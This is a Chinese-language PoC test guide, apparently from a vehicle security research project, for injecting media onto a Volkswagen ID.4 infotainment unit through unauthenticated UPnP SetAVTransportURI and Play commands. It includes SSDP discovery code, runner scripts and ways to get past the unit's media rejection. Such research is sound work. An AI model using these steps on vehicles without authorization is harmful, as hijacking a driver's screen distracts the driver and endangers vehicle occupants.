# 大众 ID.4 UPnP 媒体投屏 PoC 测试指南

## 问题描述

**现象：** 车机收到 SOAP SetAVTransportURI 和 Play 命令后（HTTP 200），仍显示"该视频不支持投屏"（UnsupportedMediaType）

**根本原因：** 大众 ID.4 的 AVTransport 实现对媒体元数据格式有特殊要求

---

## 解决方案概览

| 脚本 | 功能 | 最佳场景 |
|------|------|--------|
| `13_Mirror_Hijack.py` | 增强版本：支持实际媒体文件、完整元数据 | 通用 UPnP 投屏 |
| `14_VW_ID4_MediaInjection.py` | 大众 ID.4 专用：多种元数据方式 | **针对大众 ID.4** ✓ |

---

## 快速开始（推荐）

### 步骤 1: 准备媒体文件

#### 选项 A: 使用真实视频文件（推荐）

```bash
# 生成一个测试 MP4 文件（5 秒，使用 FFmpeg）
ffmpeg -f lavfi -i color=c=blue:s=1280x720:d=5 -f lavfi -i sine=frequency=440:duration=5 \
  -c:v libx264 -c:a aac -shortest /tmp/test.mp4

# 或使用现有视频
# 将视频转换为标准格式（H.264 编码）
ffmpeg -i your_video.mp4 -c:v libx264 -preset fast -c:a aac /tmp/test_vw.mp4
```

#### 选项 B: 生成最小测试 MP4

```bash
# Python 生成最小 MP4
python3 << 'EOF'
from server.pocs.application.mock_vehicle_services import generate_minimal_mp4
with open("/tmp/minimal.mp4", "wb") as f:
    f.write(generate_minimal_mp4())
print("[+] 生成 /tmp/minimal.mp4")
EOF
```

#### 选项 C: 从互联网下载

```bash
# 下载一个开源视频样本
wget -O /tmp/sample.mp4 https://commondatastorage.googleapis.com/gtv-videos-library/sample/bigbuckbunny.mp4
```

### 步骤 2: 运行大众 ID.4 专用脚本

```bash
python3 14_VW_ID4_MediaInjection.py <车机IP> --media /tmp/test.mp4
```

**示例输出：**
```
[1/8] 发送 SSDP 发现请求...
[+] 发现 LOCATION: http://192.168.1.100:8080/description.xml
[2/8] ControlURL: http://192.168.1.100:8080/upnp/control/media1
[HTTP] 媒体服务器启动 (端口 8000)
[3/8] 媒体 URL: http://192.168.1.x:8000/video.mp4
[4/8] 开始尝试多种注入方法...
[*] 尝试方法: 方法 1: 空元数据
  ├─ SetAVTransportURI: HTTP 200 ✓
  └─ Play: HTTP 200 ✓
[!] 【成功】方法 1: 空元数据 投屏成功!
```

### 步骤 3: 车机行为观察

**成功迹象：**
- ✓ 车机屏幕弹出投屏窗口
- ✓ 显示正在加载视频
- ✓ 视频/图片成功显示在车机上
- ✓ 可以正常播放、暂停、前进/后退

**失败迹象：**
- ✗ 投屏窗口显示"视频不支持投屏"
- ✗ 窗口立即关闭
- ✗ 脚本报告"所有方法均失败"

---

## 详细调试步骤

### 如果基本方法失败，逐步尝试：

#### 1. 验证网络连通性

```bash
# 测试与车机的连接
ping <车机IP>

# 测试 SSDP 发现是否工作
python3 << 'EOF'
import socket
msg = b'\r\n'.join([
    b'M-SEARCH * HTTP/1.1',
    b'HOST: 239.255.255.250:1900',
    b'MAN: "ssdp:discover"',
    b'MX: 2',
    b'ST: upnp:rootdevice',
    b'', b''
])
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(msg, ("239.255.255.250", 1900))
sock.settimeout(3)
try:
    while True:
        data, addr = sock.recvfrom(1024)
        if b'LOCATION:' in data:
            print(f"[+] 发现设备: {addr}")
except:
    pass
EOF
```

#### 2. 检查车机支持的服务版本

```bash
python3 << 'EOF'
import requests
import xml.etree.ElementTree as ET

# 获取设备描述符
location = "http://<车机IP>:8080/description.xml"  # 根据实际调整
resp = requests.get(location)
root = ET.fromstring(resp.content)

# 查找 AVTransport 服务
ns = {"upnp": "urn:schemas-upnp-org:device-1-0"}
for service in root.findall(".//upnp:service", ns):
    stype = service.find("upnp:serviceType", ns)
    if stype is not None and "AVTransport" in stype.text:
        print(f"[+] 服务类型: {stype.text}")

# 另外查看是否还有 RenderingControl 等其他服务
EOF
```

#### 3. 验证媒体文件格式

```bash
# 检查生成的 MP4 是否有效
ffprobe -v error -show_format -show_streams /tmp/test.mp4

# 确保使用 H.264 视频编码和 AAC 音频编码
```

#### 4. 添加详细日志

修改脚本以启用调试输出：

```python
# 在脚本中更改日志级别
import logging
logging.basicConfig(level=logging.DEBUG)
```

#### 5. 尝试替代媒体类型

```bash
# 尝试图片投屏（通常更简单）
python3 14_VW_ID4_MediaInjection.py <车机IP> --media image.jpg

# 生成测试图片
python3 << 'EOF'
from PIL import Image
img = Image.new('RGB', (1280, 720), color='blue')
img.save('/tmp/test.jpg')
EOF
```

---

## 高级调试：捕获完整 SOAP 交互

创建文件 `debug_soap.py`：

```python
import requests
from requests.adapters import HTTPAdapter
import logging
from http.client import HTTPConnection

# 启用 HTTP 调试
HTTPConnection.debuglevel = 1
logging.basicConfig()
logging.getLogger().setLevel(logging.DEBUG)
requests_log = logging.getLogger("requests.packages.urllib3")
requests_log.setLevel(logging.DEBUG)
requests_log.propagate = True

# 然后运行正常的脚本，完整的 HTTP 请求/响应会被记录
```

---

## 常见错误与解决方案

| 问题 | 原因 | 解决方案 |
|------|------|--------|
| "该视频不支持投屏" | 元数据格式不符 | 尝试脚本 14 的多种方法 |
| "无法连接到服务" | 网络隔离或防火墙 | 确保在同一局域网 |
| SSDP 无响应 | 设备不支持 UPnP | 确认设备型号和固件 |
| HTTP 500 错误 | 车机内部错误 | 重启车机或尝试其他参数 |
| "Play 返回 402/403" | 需要认证或授权 | 查看脚本的 GetTransportInfo |

---

## 大众 ID.4 特定注意事项

### 已知限制

1. **元数据格式严格** - 某些大众车型对 DIDL-Lite XML 元数据有特定要求
2. **版本差异** - AVTransport 1.0 vs 2.0 可能有差异
3. **时序要求** - SetAVTransportURI 和 Play 之间需要延迟
4. **媒体验证** - 车机会验证实际媒体内容，不接受虚假数据

### 推荐参数

```python
# 对大众 ID.4 效果最好的参数组合

# 1. 最简单的方式（推荐首选）
SetAVTransportURI with empty metadata
Play with Speed=1

# 2. 如果需要元数据
Simple DIDL-Lite: &lt;DIDL-Lite&gt;&lt;item&gt;&lt;res&gt;{url}&lt;/res&gt;&lt;/item&gt;&lt;/DIDL-Lite&gt;

# 3. 完整元数据（如果支持）
Include: dc:title, upnp:class, protocolInfo attributes
```

### 媒体文件建议

- **视频**: H.264 编码, 1280x720 或更低分辨率, AAC 音频, 30fps
- **图片**: JPEG 或 PNG, 1280x720 分辨率
- **容器**: MP4 (H.264+AAC) 兼容性最好

---

## 完整流程（从零开始）

```bash
#!/bin/bash

TARGET_IP="192.168.1.100"  # 修改为实际车机 IP
MEDIA_FILE="/tmp/test.mp4"

# 1. 生成或下载测试媒体
echo "[1] 准备媒体文件..."
if [ ! -f "$MEDIA_FILE" ]; then
    # 如果没有 ffmpeg，可以下载
    wget -O "$MEDIA_FILE" "https://commondatastorage.googleapis.com/gtv-videos-library/sample/BigBuckBunny.mp4" 2>/dev/null || \
    echo "[!] 请安装 ffmpeg 或手动放置 MP4 文件到 $MEDIA_FILE"
fi

# 2. 运行脚本
echo "[2] 启动投屏..."
cd /Users/queen/Desktop/ICV_POC_research/autosec-guard---icv-vulnerability-scanner/server/pocs/application/
python3 14_VW_ID4_MediaInjection.py "$TARGET_IP" --media "$MEDIA_FILE"

echo "[3] 检查车机屏幕"
```

---

## 如果还是不行？

1. **降级到 13_Mirror_Hijack.py** - 使用更基础的方法
2. **检查车机型号** - 不同年份 ID.4 可能有不同实现
3. **查找大众官方文档** - 某些车型可能有特殊 URN
4. **尝试 RTSP 协议** - 作为 HTTP 的备选方案

---

## 参考资源

- UPnP Device Architecture: http://upnp.org/specs/arch/
- DIDL-Lite Standard: http://www.upnp.org/schemas/av/didl-lite.xsd
- AVTransport Service: http://www.upnp.org/specs/av/AVTransport/
- Volkswagen IVI Security (学术资源)

---

## 记录与反馈

如果成功投屏，请记录：
- [ ] 车机型号和固件版本
- [ ] 使用的脚本版本
- [ ] 成功的元数据方式
- [ ] 投屏的媒体类型（视频/图片）
- [ ] 完整的日志输出

这些信息将帮助改进脚本对其他大众车型的兼容性。
